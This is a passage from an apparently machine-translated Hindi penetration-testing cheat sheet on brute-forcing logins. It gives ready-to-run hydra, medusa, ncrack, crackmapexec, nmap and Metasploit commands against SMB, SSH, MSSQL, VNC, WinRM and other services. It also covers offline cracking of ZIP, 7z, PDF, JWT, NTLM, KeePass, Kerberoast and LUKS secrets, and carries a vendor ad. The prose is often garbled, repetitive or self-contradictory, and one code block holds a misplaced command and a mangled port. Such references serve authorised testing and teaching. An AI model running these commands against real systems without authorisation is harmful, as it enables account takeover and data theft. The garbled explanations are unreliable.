ब्रूट फ़ोर्स अटैक के लिए हम विभिन्न टूल्स जैसे Hydra, Medusa, smbmap, smbclient, smbpasswd, smbget, smbexec, crackmapexec, impacket, enum4linux, nmap, Metasploit, आदि का उपयोग कर सकते हैं। इन टूल्स की मदद से हम ब्रूट फ़ोर्स अटैक को अधिक सफल और अवधारणशील बना सकते हैं।

ब्रूट फ़ोर्स अटैक के दौरान कुछ बातों का ध्यान रखना महत्वपूर्ण है। पहले, हमेशा एक शक्तिशाली पासवर्ड सूची का उपयोग करें जो विभिन्न पासवर्ड कोशिकाओं को कवर करती हो। दूसरे, ब्रूट फ़ोर्स अटैक के लिए एक अधिकतम प्रयास सीमा निर्धारित करें ताकि अवैध लॉगिन प्रयासों की संख्या पर प्रतिबंध लगा सकें। तीसरे, ब्रूट फ़ोर्स अटैक के दौरान लॉग फ़ाइलों को ध्यान से जांचें ताकि आप अवैध लॉगिन प्रयासों को ट्रैक कर सकें और उन्हें रोक सकें।

ब्रूट फ़ोर्स अटैक एक प्रभावी तकनीक है जो उपयोगकर्ता के पासवर्ड की सुरक्षा को परीक्षण करने में मदद करती है। यह एक आपूर्ति और मांग का खेल है, जहां हमें संभावित पासवर्ड की खोज करनी होती है और सर्वर के साथ संचालन करने के लिए उसे उपयोग करनी होती है। ब्रूट फ़ोर्स अटैक के द्वारा हम नेटवर्क सुरक्षा की कमियों को पहचान सकते हैं और उन्हें ठीक करने के लिए कदम उठा सकते हैं।
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
```
### SMTP

SMTP (Simple Mail Transfer Protocol) एक प्रोटोकॉल है जो ईमेल के लिए उपयोग होता है। यह ईमेल संदेशों को एक सर्वर से दूसरे सर्वर तक भेजने के लिए उपयोग होता है। SMTP ब्रूट फोर्स एक तकनीक है जिसमें हम एक विशेषता के साथ विभिन्न पासवर्ड की कोशिशें करते हैं ताकि हम उस विशेषता के लिए सही पासवर्ड को खोज सकें। यह एक प्रभावी तकनीक है जो अनुमानित पासवर्ड की संख्या को कम करने में मदद करती है और अनुमानित पासवर्ड को खोजने का समय कम करती है।

ब्रूट फोर्स अटैक के दौरान, हम एक पासवर्ड की संभावित मान्यता की संख्या को निर्धारित करते हैं और उसे एक विशेषता के साथ संयुक्त करते हैं। फिर हम एक लिस्ट में संभावित पासवर्ड की कोशिशें करते हैं और उन्हें एक्सेस क्रेडेंशियल्स के रूप में उपयोग करते हैं। यदि हमें सही पासवर्ड मिलता है, तो हम सफलतापूर्वक एक्सेस प्राप्त कर सकते हैं।

ब्रूट फोर्स अटैक के लिए कुछ उपकरण और स्क्रिप्ट उपलब्ध हैं जो हमें ब्रूट फोर्स अटैक को अधिक सुविधाजनक बनाने में मदद करते हैं। हम इन उपकरणों का उपयोग करके विभिन्न प्रोटोकॉल और सेवाओं के लिए ब्रूट फोर्स अटैक कर सकते हैं, जिनमें SMTP भी शामिल है।
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
```
### SOCKS

SOCKS (Socket Secure) एक नेटवर्क प्रोटोकॉल है जो इंटरनेट कनेक्शन को एन्क्रिप्ट करने और गोपनीयता को सुनिश्चित करने के लिए उपयोग होता है। यह एक प्रोक्सी प्रोटोकॉल है जो उपयोगकर्ता को अनुमति देता है अपने सिस्टम को एक दूसरे सिस्टम के माध्यम से इंटरनेट से कनेक्ट करने के लिए। SOCKS प्रोटोकॉल का उपयोग करके, उपयोगकर्ता अपने डेटा को एन्क्रिप्ट करके और एन्क्रिप्टेड डेटा को एक रिमोट सर्वर के माध्यम से भेजकर अपनी गोपनीयता को सुरक्षित रख सकता है।

SOCKS प्रोटोकॉल का उपयोग करके ब्रूट फोर्स हमले को अधिक सुरक्षित बनाने के लिए एक प्रोक्सी चेन का उपयोग किया जा सकता है। इसके लिए, हम एक SOCKS प्रोक्सी सर्वर को सेटअप करते हैं और उसे ब्रूट फोर्स टूल के रूप में कॉन्फ़िगर करते हैं। इसके बाद, ब्रूट फोर्स टूल उपयोगकर्ता के नाम और पासवर्ड की ब्रूट फोर्सिंग करने के लिए SOCKS प्रोक्सी सर्वर का उपयोग करेगा। इस प्रक्रिया में, ब्रूट फोर्स टूल के द्वारा उत्पन्न होने वाले ट्रैफ़िक को एन्क्रिप्ट किया जाता है और उपयोगकर्ता के सिस्टम को सीधे एक रिमोट सर्वर से कनेक्ट किया जाता है। इस तरीके से, ब्रूट फोर्स हमले को ट्रैक करना और रोकना मुश्किल हो जाता है।
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
```
### SSH

SSH (Secure Shell) एक क्रिप्टोग्राफिक नेटवर्क प्रोटोकॉल है जिसका उपयोग दूरस्थ लॉगिन और नेटवर्क सुरक्षा के लिए किया जाता है। SSH के माध्यम से, उपयोगकर्ता एक सुरक्षित रूप से रिमोट मशीन पर लॉगिन कर सकते हैं और दूरस्थ सिस्टम पर कमांड चला सकते हैं। SSH कनेक्शन को एक्सेस करने के लिए, उपयोगकर्ता को एक यूजरनेम और पासवर्ड की आवश्यकता होती है।

SSH ब्रूट फोर्स एक तकनीक है जिसमें हम एक यूजरनेम और पासवर्ड की सूची का उपयोग करके SSH सर्वर पर लॉगिन करने की कोशिश करते हैं। यह एक प्रभावी तकनीक है जो उपयोगकर्ताओं के द्वारा उपयोग किए जाने वाले आसान पासवर्डों को खोजने में मदद कर सकती है। इसके लिए, हम एक यूजरनेम और पासवर्ड की सूची तैयार करते हैं और उसे SSH कनेक्शन के लिए उपयोग करते हैं। यदि सही यूजरनेम और पासवर्ड मिल जाते हैं, तो हम सफलतापूर्वक SSH सर्वर पर लॉगिन कर सकते हैं।

SSH ब्रूट फोर्स करने के लिए, हम विभिन्न टूल्स और स्क्रिप्ट्स का उपयोग कर सकते हैं, जैसे Hydra, Medusa, Patator आदि। इन टूल्स के माध्यम से, हम बड़ी संख्या में यूजरनेम और पासवर्ड की संभावित सूची को आवेदन कर सकते हैं और SSH सर्वर पर ब्रूट फोर्स अटैक कर सकते हैं। यह तकनीक अक्सर एक लंबे समय तक चलती है, इसलिए इसे ध्यानपूर्वक और सतर्कता के साथ उपयोग करना चाहिए।
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
```
#### कमजोर SSH कुंजी / Debian पूर्वानुमानयोग्य PRNG

कुछ सिस्टमों में यात्राओं के लिए उपयोग किए जाने वाले यादृच्छिक बीज में ज्ञात दोष हो सकते हैं। इसके परिणामस्वरूप, यह एक बहुत कम कुंजी स्थान का परिणाम हो सकता है जिसे [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) जैसे उपकरणों के साथ bruteforced किया जा सकता है। कमजोर कुंजी के पूर्व-उत्पन्न सेट भी उपलब्ध हैं जैसे [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)।

### SQL सर्वर
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### टेलनेट

Telnet एक नेटवर्क प्रोटोकॉल है जिसका उपयोग रिमोट मशीनों पर दूरस्थ लॉगिन करने के लिए किया जाता है। यह TCP/IP प्रोटोकॉल का उपयोग करता है और इंटरनेट और लोकल नेटवर्कों के बीच संचार स्थापित करने में मदद करता है। टेलनेट का उपयोग करके, आप रिमोट मशीन पर कमांड लाइन इंटरफेस के माध्यम से कार्य कर सकते हैं।

टेलनेट ब्रूट फोर्स एक तकनीक है जिसमें हम एक यूजरनेम और पासवर्ड की सूची का उपयोग करके टेलनेट सर्वर पर लॉगिन करने की कोशिश करते हैं। हम एक ब्रूट फोर्स टूल का उपयोग करके यूजरनेम और पासवर्ड की सूची को आवश्यकतानुसार बदलते हैं और टेलनेट सर्वर के साथ कनेक्ट करने की कोशिश करते हैं। यदि हमें सफलता मिलती है, तो हम उपयोगकर्ता के खाते में लॉगिन कर सकते हैं।

टेलनेट ब्रूट फोर्स अक्सर एक प्राथमिक हमला होता है जो एक नेटवर्क पर उपयोगकर्ताओं के खातों की सुरक्षा को परखने के लिए किया जाता है। यह एक साधारण और प्रभावी तकनीक है, लेकिन यह ध्यान देने योग्य है कि यह केवल उपयोगकर्ता नाम और पासवर्ड की सूची के लिए काम करता है और यह अनुमान लगाने के लिए बहुत समय ले सकता है।
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet
```
### VNC

VNC (Virtual Network Computing) एक रिमोट डेस्कटॉप प्रोटोकॉल है जिसका उपयोग रिमोट मशीन को दूरस्थ रूप से नियंत्रित करने के लिए किया जाता है। VNC के द्वारा, उपयोगकर्ता एक मशीन को दूसरे मशीन पर दूरस्थ रूप से देख सकता है और उसे नियंत्रित कर सकता है।

ब्रूट फोर्स एक तकनीक है जिसमें हम एक विशेषता के लिए संभावित पासवर्ड की सूची का उपयोग करके उसे खोजते हैं। VNC पर ब्रूट फोर्स हमें एक या एक से अधिक उपयोगकर्ता नाम और पासवर्ड की सूची का उपयोग करके विभिन्न पासवर्ड की कोशिकाओं को आजमाने की अनुमति देता है। यह तकनीक उपयोगकर्ता के लॉगिन क्रेडेंशियल्स को खोजने के लिए उपयोगी हो सकती है और अनधिकृत उपयोगकर्ताओं के द्वारा उपयोग की जा सकती है।

ब्रूट फोर्स अटैक को कम करने के लिए, आप विभिन्न तकनीकों का उपयोग कर सकते हैं, जैसे कि विशेषता के लिए अद्यतित पासवर्ड की सूची का उपयोग करना, ब्रूट फोर्स की गति को नियंत्रित करना, ब्रूट फोर्स के लिए विशेषता की गणना करना, और ब्रूट फोर्स के लिए विशेषता की गणना करना।

ध्यान दें कि ब्रूट फोर्स अटैक एक समय लेने वाली प्रक्रिया हो सकती है, इसलिए आपको धैर्य और संयम रखना आवश्यक है। इसके अलावा, आपको ध्यान देना चाहिए कि ब्रूट फोर्स अटैक अवैध हो सकता है और किसी भी नियमित नेटवर्क या सिस्टम पर अनुमति प्राप्त करने के लिए केवल अपने अनुमति के अंदर ही उपयोग किया जाना चाहिए।
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm (Windows Remote Management) एक प्रोटोकॉल है जो विंडोज सिस्टम पर दूरस्थ प्रबंधन के लिए उपयोग होता है। यह प्रोटोकॉल विंडोज सिस्टम पर दूरस्थ एक्सेस और प्रबंधन के लिए सुरक्षित तरीके से संचालित होता है। Winrm का उपयोग करके, आप दूरस्थ विंडोज सिस्टम पर कमांड चला सकते हैं, फ़ाइलें संचालित कर सकते हैं, और अन्य प्रबंधन कार्य कर सकते हैं।

Winrm को ब्रूट फ़ोर्स अटैक के लिए उपयोग किया जा सकता है। इसमें एक हमलावर Winrm सर्वर के खाते के लिए विभिन्न पासवर्ड की कोशिशें करता है। यह एक प्रभावी तकनीक है जो खाते के लॉक आउट की सीमा तक पासवर्ड की कोशिशें करती है। ब्रूट फ़ोर्स अटैक के दौरान, एक शब्दकोश या शब्दकोशों का उपयोग किया जाता है जिसमें संभावित पासवर्ड के विभिन्न संभावित संयोजनों की सूची होती है। यह तकनीक अक्सर असुरक्षित या कमजोर पासवर्ड के लिए उपयोग की जाती है।

ब्रूट फ़ोर्स अटैक के दौरान, एक ब्रूट फ़ोर्स टूल का उपयोग किया जाता है जो आपको विभिन्न पासवर्ड की कोशिशें करने की अनुमति देता है। यह टूल एक शब्दकोश या शब्दकोशों का उपयोग करता है और विभिन्न पासवर्ड संयोजनों की सूची के साथ प्रयास करता है। यदि सही पासवर्ड मिल जाता है, तो हमलावर विंडोज सिस्टम पर सफलतापूर्वक लॉगिन कर सकता है।

ब्रूट फ़ोर्स अटैक को रोकने के लिए, आप अपने Winrm सर्वर के लिए मजबूत पासवर्ड निर्धारित कर सकते हैं, लॉगिन लिमिट को सीमित कर सकते हैं, और लॉगिन लॉकआउट की समय सीमा निर्धारित कर सकते हैं। इसके अलावा, आप ब्रूट फ़ोर्स अटैक की गति को धीमा करने के लिए लॉगिन लिमिट को बढ़ा सकते हैं। यह सुरक्षा सुनिश्चित करने में मदद करेगा क्योंकि यह हमलावर को अनंत पासवर्ड की कोशिशें करने से रोकेगा।
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और आसानी से वर्ल्ड के सबसे उन्नत सामुदायिक उपकरणों द्वारा संचालित **वर्कफ़्लो** बनाएं और स्वचालित करें।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## स्थानीय

### ऑनलाइन क्रैकिंग डेटाबेस

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 और SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 एसएसपी/एसएसपी के बिना और किसी भी चुनौती के मान के साथ)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (हैश, WPA2 कैप्चर्स, और आर्काइव MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (हैश)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (हैश और फ़ाइल हैश)
* [https://hashes.org/search.php](https://hashes.org/search.php) (हैश)
* [https://www.cmd5.org/](https://www.cmd5.org) (हैश)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

हैश को ब्रूट फ़ोर्स करने से पहले इसे जांचें।

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### ज्ञात प्लेनटेक्स्ट ज़िप हमला

आपको एन्क्रिप्टेड ज़िप में समाहित एक फ़ाइल के **प्लेनटेक्स्ट** (या प्लेनटेक्स्ट का हिस्सा) को जानने की आवश्यकता होती है। आप एन्क्रिप्टेड ज़िप में समाहित फ़ाइलों के **फ़ाइलनेम और आकार की जांच** कर सकते हैं: **`7z l encrypted.zip`**\
[**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)को रिलीज़ पेज से डाउनलोड करें।
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

7z एक फ़ाइल संपीड़न प्रोग्राम है जो .7z फ़ाइल एक्सटेंशन के साथ फ़ाइलों को संपीड़ित करने के लिए उपयोग किया जाता है। यह एक ओपन सोर्स प्रोजेक्ट है और विभिन्न प्लेटफ़ॉर्मों पर उपलब्ध है। 7z फ़ाइलों को अन्य संपीड़न फ़ाइल प्रारूपों (जैसे .zip, .rar) से भी अधिक संपीड़ित करता है।

यदि आपको 7z फ़ाइल का पासवर्ड पता नहीं है और आप इसे खोलने की कोशिश कर रहे हैं, तो आप ब्रूट फ़ोर्स अटैक का उपयोग कर सकते हैं। ब्रूट फ़ोर्स अटैक में, हम एक शब्दकोश का उपयोग करते हैं और संभावित पासवर्ड की प्रत्येक संभावितता की जांच करते हैं। यह एक समय लेने वाली प्रक्रिया हो सकती है, लेकिन यह अक्सर परिणामदायी होती है जब आपके पास कुछ जानकारी या संभावित पासवर्ड की अनुमानित सूची होती है।

ब्रूट फ़ोर्स अटैक के लिए, हम विभिन्न टूल्स का उपयोग कर सकते हैं जैसे कि 7z खुद, John the Ripper, Hashcat आदि। इन टूल्स का उपयोग करके, हम एक शब्दकोश को लोड करते हैं और उसे ब्रूट फ़ोर्स अटैक के लिए उपयोग करते हैं। यदि हमारे पास एक अनुमानित पासवर्ड की सूची है, तो हम उसे भी उपयोग कर सकते हैं।

ब्रूट फ़ोर्स अटैक के दौरान, हमें ध्यान देने की आवश्यकता होती है कि हम अधिकतम पासवर्ड प्रयासों की सीमा सेट करें ताकि हम खात्री न करें और खात्री न करें। इसके अलावा, हमें एक शब्दकोश का उपयोग करना चाहिए जो संभावित पासवर्ड की अनुमानित सूची को ध्यान में रखते हुए तैयार किया गया हो। इससे हमारे पास अधिक संभावितताएं होती हैं और हमें अधिक संभावित पासवर्ड की जांच करने की आवश्यकता नहीं होती है।
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
# PDF

PDF (Portable Document Format) एक फ़ाइल प्रारूप है जो विभिन्न प्लेटफ़ॉर्म्स पर दस्तावेज़ों को संग्रहीत करने और साझा करने के लिए उपयोग होता है। PDF फ़ाइलें वस्तुतः अनुप्रयोगों, टेक्स्ट, छवियाँ और अन्य सामग्री को संग्रहीत करती हैं।

PDF फ़ाइलों को ब्रूट फ़ोर्स तकनीक का उपयोग करके हैक किया जा सकता है। ब्रूट फ़ोर्स एक हैकिंग तकनीक है जिसमें हम एक विशेषता के लिए संभावित सभी संभावित मानों की कोशिश करते हैं। इसका उपयोग पासवर्ड, यूज़रनेम, या अन्य संदेशों को खोलने के लिए किया जा सकता है।

PDF फ़ाइलों को ब्रूट फ़ोर्स करने के लिए, हम एक ब्रूट फ़ोर्स टूल का उपयोग कर सकते हैं जो संभावित पासवर्ड की सूची को आवश्यकतानुसार चलाता है। यह टूल एक-एक करके हर संभावित मान की कोशिश करता है जब तक सही पासवर्ड नहीं मिल जाता है। इसके लिए, हमें एक शब्दकोश या शब्द सूची की आवश्यकता होती है जिसमें संभावित पासवर्ड हो सकते हैं।

ब्रूट फ़ोर्स अटैक के दौरान, यह महत्वपूर्ण है कि हम एक शक्तिशाली पासवर्ड सूची का उपयोग करें जो संभावित पासवर्डों को शामिल करती है। इसके अलावा, हमें ब्रूट फ़ोर्स अटैक की गति को सीमित करने के लिए एक विशेषता की गणना करनी चाहिए, जैसे कि अधिकतम प्रयासों की संख्या या विलंब समय।

ब्रूट फ़ोर्स अटैक के दौरान, हमें ध्यान देना चाहिए कि यह एक समय लेने वाली प्रक्रिया हो सकती है, खासकर जब हमें बहुत संभावित मानों की कोशिश करनी होती है। इसलिए, हमें धैर्य रखना और अपने संसाधनों को समय-समय पर जांचना चाहिए ताकि हम अधिकतम प्रयासों की संख्या और समय को नियंत्रित कर सकें।
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### PDF मालिक पासवर्ड

एक PDF मालिक पासवर्ड को क्रैक करने के लिए इसे देखें: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### NTLM क्रैकिंग

NTLM क्रैकिंग एक तकनीक है जिसका उपयोग उपयोगकर्ता के NTLM हैश को तोड़ने के लिए किया जाता है। NTLM हैश उपयोगकर्ता के पासवर्ड को सुरक्षित रूप से संग्रहीत करता है। इस तकनीक का उपयोग करके, हम एक ब्रूट फ़ोर्स हमला चला सकते हैं जिसमें हम विभिन्न पासवर्ड संभावनाएं प्रयास करते हैं ताकि हम उपयोगकर्ता के NTLM हैश को तोड़ सकें।

यहां कुछ उपयोगी उपकरण और तकनीकें हैं जो NTLM क्रैकिंग के लिए उपयोगी हो सकती हैं:

- **John the Ripper**: यह एक पासवर्ड क्रैकिंग उपकरण है जिसका उपयोग NTLM हैश को तोड़ने के लिए किया जा सकता है।
- **Hashcat**: यह भी एक पासवर्ड क्रैकिंग उपकरण है जिसका उपयोग NTLM हैश को तोड़ने के लिए किया जा सकता है।
- **Medusa**: यह एक ब्रूट फ़ोर्स और दूसरे तकनीकी हमलों के लिए उपयोगी हो सकता है। इसका उपयोग NTLM क्रैकिंग के लिए भी किया जा सकता है।

यदि आप NTLM क्रैकिंग कर रहे हैं, तो ध्यान दें कि यह एक समय लेने वाली प्रक्रिया हो सकती है, खासकर यदि पासवर्ड लंबा और मजबूत है। इसलिए, आपको धैर्य और संयम रखने की आवश्यकता होती है।
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass

Keepass एक पासवर्ड प्रबंधक है जो आपको सुरक्षित तरीके से अपने पासवर्डों को संग्रहीत करने और प्रबंधित करने की सुविधा प्रदान करता है। यह एक खुला स्रोत सॉफ्टवेयर है और विभिन्न प्लेटफॉर्म्स पर उपलब्ध है, जिसमें शामिल हैं Windows, macOS, और Linux। Keepass आपको एक मुख्य कुंजी या मास्टर पासवर्ड का उपयोग करके अपने सभी पासवर्डों को सुरक्षित रखने की अनुमति देता है। यह एक शक्तिशाली और सुरक्षित विकल्प है जो आपकी निजी जानकारी को सुरक्षित रखने में मदद करता है।
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
#### ब्रूट फोर्स

ब्रूट फोर्स एक आम हैकिंग तकनीक है जिसमें हम एक विशेषता के लिए संभावित पासवर्ड की सूची का उपयोग करके लॉगिन प्रमाणीकरण को तोड़ने का प्रयास करते हैं। इस तकनीक का उपयोग करके हम एक वेब या नेटवर्क सेवा के लिए उपयोग होने वाले पासवर्ड को खोज सकते हैं। यह तकनीक अक्सर ब्रूट फोर्स अटैक के रूप में जानी जाती है।

ब्रूट फोर्स अटैक के दो प्रमुख प्रकार होते हैं: एकल ब्रूट फोर्स और डिक्शनरी ब्रूट फोर्स। एकल ब्रूट फोर्स में, हम एक-एक करके संभावित पासवर्ड की सूची का उपयोग करते हैं और प्रत्येक पासवर्ड के लिए लॉगिन प्रमाणीकरण का प्रयास करते हैं। डिक्शनरी ब्रूट फोर्स में, हम एक पासवर्ड शब्दकोश का उपयोग करते हैं जिसमें संभावित पासवर्ड हो सकते हैं और उन्हें एक-एक करके लॉगिन प्रमाणीकरण के लिए उपयोग करते हैं।

ब्रूट फोर्स अटैक को अक्सर वेब एप्लिकेशन, नेटवर्क सेवाएं, डेटाबेस और अन्य प्रमाणीकरण में उपयोग किया जाता है। यह तकनीक अक्सर असुरक्षित यूजरनेम और पासवर्ड के कारण संभावित होती है। इसलिए, एक अच्छी पासवर्ड नीति और दुर्गम पासवर्ड का उपयोग करना अत्यंत महत्वपूर्ण है।

ब्रूट फोर्स अटैक को रोकने के लिए कुछ उपाय हैं, जैसे कि लॉगिन प्रमाणीकरण के लिए लॉकआउट नीति, कैप्चा, टूफा प्रमाणीकरण, द्विचरणीय प्रमाणीकरण और एक्स्ट्रा लेयर्स के उपयोग का अनुमान लगाना।

ब्रूट फोर्स अटैक के लिए कुछ टूल्स और रिसोर्सेज भी उपलब्ध हैं, जैसे कि Hydra, Medusa, Ncrack, John the Ripper, Hashcat और Crunch। इन टूल्स का उपयोग करके हम ब्रूट फोर्स अटैक को अधिक प्रभावी और तेज़ बना सकते हैं।
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### लक्ष्य छवि

#### विधि 1

स्थापित करें: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### तकनीक 2

```plaintext
Brute force is a method of trying every possible combination of characters until the correct one is found. It is commonly used in password cracking, where an attacker tries different combinations of characters to guess the password. Brute force attacks can be time-consuming and resource-intensive, but they can be effective if the password is weak or if the attacker has enough computing power.

There are several tools available for performing brute force attacks, such as Hydra, Medusa, and John the Ripper. These tools automate the process of trying different combinations of characters and can be customized to fit specific needs.

When performing a brute force attack, it is important to consider the target's password policy. Some systems have restrictions on password length, complexity, and lockout policies, which can make the attack more difficult. It is also important to use a good wordlist or dictionary of possible passwords to increase the chances of success.

Brute force attacks can be mitigated by implementing strong password policies, such as requiring longer and more complex passwords, implementing account lockout policies, and using multi-factor authentication. Additionally, monitoring for unusual login attempts and implementing rate limiting can help detect and prevent brute force attacks.
```

```plaintext
